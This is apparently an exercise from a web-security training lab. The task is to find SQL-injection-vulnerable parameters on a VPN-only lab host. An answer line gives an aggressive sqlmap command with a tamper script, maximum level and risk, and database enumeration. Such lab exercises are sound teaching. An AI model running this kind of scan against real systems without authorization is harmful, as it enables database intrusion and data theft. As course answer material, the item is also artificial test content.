0. SQLi - Basic Injection Discovery
The first step in exploiting SQL injection vulnerabilities is to identify which parameters are vulnerable.
Your goal is to identify which parameters in the applicationâ€™s web pages are susceptible to SQL injection attacks. For that you should:

Access the machine cyber_websec_0x01 through the VPN.
Navigate to: http://web0x01.hbtn/a3/sql_injection/. (dont forget to edit your /etc/hosts)
Search for the vulnerable paramters.

R: 
sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --tamper=space2comment --level=5 --risk=3 --dbs
